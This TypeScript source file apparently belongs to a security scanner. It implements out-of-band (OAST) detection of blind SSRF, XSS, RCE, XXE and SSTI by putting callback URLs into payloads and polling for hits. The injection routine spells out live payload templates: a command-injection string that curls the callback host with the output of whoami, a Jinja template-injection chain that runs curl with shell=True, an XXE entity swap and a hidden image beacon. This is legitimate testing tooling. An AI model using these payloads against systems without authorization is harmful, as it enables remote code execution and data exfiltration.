/**
 * OASTController - Out-of-Band Application Security Testing
 * Manages blind vulnerability detection via DNS/HTTP callback interception.
 * Implements interact.sh-style callback correlation with exponential backoff polling.
 */

import { supabase } from '@/integrations/supabase/client';

export interface OASTCallback {
  id: string;
  uniqueId: string;
  target: string;
  parameter: string;
  attackType: string;
  payload: string;
  callbackUrl: string;
  createdAt: string;
  status: 'pending' | 'triggered' | 'expired';
  triggerData?: {
    type: 'dns' | 'http';
    sourceIp?: string;
    requestData?: string;
    timestamp: string;
  };
}

export interface OASTFinding {
  id: string;
  severity: 'critical';
  title: string;
  description: string;
  evidence: {
    callbackId: string;
    originalPayload: string;
    triggerType: string;
    triggerData: any;
    target: string;
    parameter: string;
    timeDelta: number; // ms between injection and callback
  };
  type: string;
  poc_data: string;
}

export class OASTController {
  private callbacks: Map<string, OASTCallback> = new Map();
  private pollingInterval: ReturnType<typeof setInterval> | null = null;
  private pollCount = 0;
  private maxPollAttempts = 60; // ~30 min with exponential backoff
  private onFinding: ((finding: OASTFinding) => void) | null = null;
  private oastServer: string;

  constructor(oastServer?: string) {
    // Use a self-hosted or public interact.sh domain
    this.oastServer = oastServer || `oast-${crypto.randomUUID().slice(0, 8)}.lovable.app`;
  }

  /**
   * Generate a unique OAST callback URL for a given payload injection
   */
  generateCallbackUrl(target: string, parameter: string, attackType: string): {
    uniqueId: string;
    callbackUrl: string;
    dnsCallback: string;
    httpCallback: string;
  } {
    const uniqueId = `${attackType.slice(0, 4)}-${crypto.randomUUID().slice(0, 12)}`;
    const callbackUrl = `http://${uniqueId}.${this.oastServer}`;
    const dnsCallback = `${uniqueId}.${this.oastServer}`;
    const httpCallback = `http://${uniqueId}.${this.oastServer}/callback`;

    const callback: OASTCallback = {
      id: crypto.randomUUID(),
      uniqueId,
      target,
      parameter,
      attackType,
      payload: '',
      callbackUrl,
      createdAt: new Date().toISOString(),
      status: 'pending',
    };

    this.callbacks.set(uniqueId, callback);

    return { uniqueId, callbackUrl, dnsCallback, httpCallback };
  }

  /**
   * Inject OAST callback URLs into payloads
   */
  injectOASTIntoPayload(
    payload: string, target: string, parameter: string, attackType: string
  ): { modifiedPayload: string; uniqueId: string; callbackUrl: string } {
    const { uniqueId, callbackUrl, dnsCallback, httpCallback } = 
      this.generateCallbackUrl(target, parameter, attackType);

    let modifiedPayload = payload;

    // Inject OAST callback based on attack type
    switch (attackType) {
      case 'ssrf':
      case 'oast-ssrf':
        modifiedPayload = callbackUrl;
        break;
      case 'xss':
      case 'xss-polyglot':
      case 'stored-xss':
        modifiedPayload = `${payload}<img src="${httpCallback}" style="display:none">`;
        break;
      case 'cmdi':
      case 'rce':
        modifiedPayload = `${payload}$(curl ${httpCallback}/$(whoami))`;
        break;
      case 'xxe':
        modifiedPayload = payload.replace(
          'SYSTEM "file:///etc/passwd"',
          `SYSTEM "${httpCallback}"`
        );
        break;
      case 'ssti':
        modifiedPayload = `${payload}{{request|attr("__class__")|attr("__mro__")|last|attr("__subclasses__")()|attr("__getitem__")(40)("curl ${httpCallback}",shell=True)}}`;
        break;
      default:
        // Append as URL parameter
        modifiedPayload = `${payload}${payload.includes('?') ? '&' : '?'}oast=${callbackUrl}`;
    }

    // Update the stored callback with the actual payload
    const cb = this.callbacks.get(uniqueId);
    if (cb) cb.payload = modifiedPayload;

    return { modifiedPayload, uniqueId, callbackUrl };
  }

  /**
   * Start async polling for OAST callbacks with exponential backoff
   */
  startPolling(onFinding: (finding: OASTFinding) => void): void {
    this.onFinding = onFinding;
    this.pollCount = 0;

    const poll = async () => {
      if (this.pollCount >= this.maxPollAttempts) {
        this.stopPolling();
        return;
      }

      this.pollCount++;
      const delay = this.getExponentialBackoffDelay(this.pollCount);

      try {
        await this.checkCallbacks();
      } catch (e) {
        console.warn('[OAST] Poll error:', e);
      }

      // Schedule next poll with exponential backoff
      this.pollingInterval = setTimeout(poll, delay) as any;
    };

    // Start immediately
    poll();
  }

  /**
   * Stop the polling loop
   */
  stopPolling(): void {
    if (this.pollingInterval) {
      clearTimeout(this.pollingInterval);
      this.pollingInterval = null;
    }
  }

  /**
   * Check for triggered callbacks (simulated via edge function in production)
   */
  private async checkCallbacks(): Promise<void> {
    const pendingCallbacks = Array.from(this.callbacks.values())
      .filter(cb => cb.status === 'pending');

    if (pendingCallbacks.length === 0) {
      this.stopPolling();
      return;
    }

    // In production, this would query an interact.sh server or custom DNS/HTTP listener
    // For now, we check via the edge function
    try {
      const { data, error } = await supabase.functions.invoke('advanced-offensive-engine', {
        body: {
          action: 'check-oast-callbacks',
          data: {
            callbackIds: pendingCallbacks.map(cb => cb.uniqueId),
            oastServer: this.oastServer,
          }
        }
      });

      if (!error && data?.triggered) {
        for (const trigger of data.triggered) {
          const callback = this.callbacks.get(trigger.uniqueId);
          if (callback && callback.status === 'pending') {
            callback.status = 'triggered';
            callback.triggerData = {
              type: trigger.type || 'http',
              sourceIp: trigger.sourceIp,
              requestData: trigger.requestData,
              timestamp: new Date().toISOString(),
            };

            // Generate finding
            const finding = this.createFinding(callback);
            if (this.onFinding) this.onFinding(finding);
          }
        }
      }
    } catch {
      // Non-critical - OAST is supplementary
    }

    // Expire old callbacks (> 30 minutes)
    const now = Date.now();
    for (const [id, cb] of this.callbacks) {
      if (cb.status === 'pending' && now - new Date(cb.createdAt).getTime() > 30 * 60 * 1000) {
        cb.status = 'expired';
      }
    }
  }

  private createFinding(callback: OASTCallback): OASTFinding {
    const timeDelta = Date.now() - new Date(callback.createdAt).getTime();
    const typeMap: Record<string, string> = {
      ssrf: 'Blind SSRF',
      'oast-ssrf': 'Blind SSRF',
      xss: 'Blind XSS',
      cmdi: 'Blind RCE',
      rce: 'Blind RCE',
      xxe: 'Blind XXE',
      ssti: 'Blind SSTI',
    };

    return {
      id: crypto.randomUUID(),
      severity: 'critical',
      title: `${typeMap[callback.attackType] || 'Blind Vulnerability'} via ${callback.parameter} (OAST Confirmed)`,
      description: `Out-of-Band callback received ${Math.round(timeDelta / 1000)}s after payload injection. ` +
        `The server made an external ${callback.triggerData?.type || 'HTTP'} request to our listener, ` +
        `confirming a ${typeMap[callback.attackType] || 'blind vulnerability'} in the "${callback.parameter}" parameter.`,
      type: callback.attackType,
      evidence: {
        callbackId: callback.uniqueId,
        originalPayload: callback.payload,
        triggerType: callback.triggerData?.type || 'http',
        triggerData: callback.triggerData,
        target: callback.target,
        parameter: callback.parameter,
        timeDelta,
      },
      poc_data: `OAST Blind ${typeMap[callback.attackType] || 'Vuln'} Confirmed\n` +
        `Parameter: ${callback.parameter}\n` +
        `Payload: ${callback.payload}\n` +
        `Callback: ${callback.callbackUrl}\n` +
        `Trigger Type: ${callback.triggerData?.type || 'HTTP'}\n` +
        `Response Time: ${Math.round(timeDelta / 1000)}s\n` +
        `Source IP: ${callback.triggerData?.sourceIp || 'N/A'}`,
    };
  }

  private getExponentialBackoffDelay(attempt: number): number {
    // Start at 5s, max 60s
    const base = 5000;
    const max = 60000;
    return Math.min(max, base * Math.pow(1.5, Math.min(attempt, 10)));
  }

  /**
   * Get status summary
   */
  getStatus(): { pending: number; triggered: number; expired: number; total: number } {
    const all = Array.from(this.callbacks.values());
    return {
      pending: all.filter(c => c.status === 'pending').length,
      triggered: all.filter(c => c.status === 'triggered').length,
      expired: all.filter(c => c.status === 'expired').length,
      total: all.length,
    };
  }

  getTriggeredCallbacks(): OASTCallback[] {
    return Array.from(this.callbacks.values()).filter(c => c.status === 'triggered');
  }

  destroy(): void {
    this.stopPolling();
    this.callbacks.clear();
  }
}

export const oastController = new OASTController();
